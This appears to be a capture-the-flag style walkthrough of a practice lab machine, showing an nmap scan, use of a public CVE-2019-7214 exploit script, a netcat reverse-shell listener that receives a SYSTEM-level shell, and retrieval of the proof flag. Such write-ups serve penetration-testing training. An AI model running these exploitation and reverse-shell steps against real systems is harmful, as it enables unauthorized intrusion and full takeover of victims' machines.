No credentials were provided for this machine

nmap -vvv -T5 -Pn 192.168.164.65 -p- -A -oN nmap.txt

sudo echo "192.168.164.65 algernon.offsec" | sudo tee -a /etc/hosts

Discovered open port 17001/tcp on 192.168.164.65

https://nvd.nist.gov/vuln/detail/CVE-2019-7214

https://github.com/devzspy/CVE-2019-7214

┌──(lepotekil㉿kali)-[~/proving-ground-prac/algernon]
└─$ python3 cve-2019-7214.py                                                                  
┌──(lepotekil㉿kali)-[~/proving-ground-prac/algernon]
└─$ 

┌──(lepotekil㉿kali)-[~/proving-ground-prac/algernon]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.170] from (UNKNOWN) [192.168.164.65] 50253
whoami
nt authority\system
PS C:\Windows\system32> cd C:\Users
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/29/2020  10:30 PM                .NET v4.5                                                             
d-----        4/29/2020  10:30 PM                .NET v4.5 Classic                                                     
d-----         5/2/2022   7:05 AM                Administrator                                                         
d-----        4/23/2020   3:16 AM                dean                                                                  
d-----       10/20/2025   7:19 AM                DefaultAppPool                                                        
d-r---        4/22/2020   4:54 AM                Public                                                                


PS C:\Users> cd Administrator
PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        4/29/2020   9:26 PM                3D Objects                                                            
d-r---        4/29/2020   9:26 PM                Contacts                                                              
d-r---         5/2/2022   7:52 AM                Desktop                                                               
d-r---        4/29/2020   9:26 PM                Documents                                                             
d-r---         5/2/2022   7:46 AM                Downloads                                                             
d-r---        4/29/2020   9:26 PM                Favorites                                                             
d-r---        4/29/2020   9:26 PM                Links                                                                 
d-r---        4/29/2020   9:26 PM                Music                                                                 
d-r---         5/2/2022   7:49 AM                OneDrive                                                              
d-r---        4/29/2020   9:34 PM                Pictures                                                              
d-r---        4/29/2020   9:26 PM                Saved Games                                                           
d-r---        4/29/2020   9:29 PM                Searches                                                              
d-r---        5/12/2020   2:04 AM                Videos                                                                


PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk                                                    
-a----       10/20/2025   7:14 AM             34 proof.txt                                                             


PS C:\Users\Administrator\Desktop> cat proof.txt
dc47120006cace295f41b92636cbb85c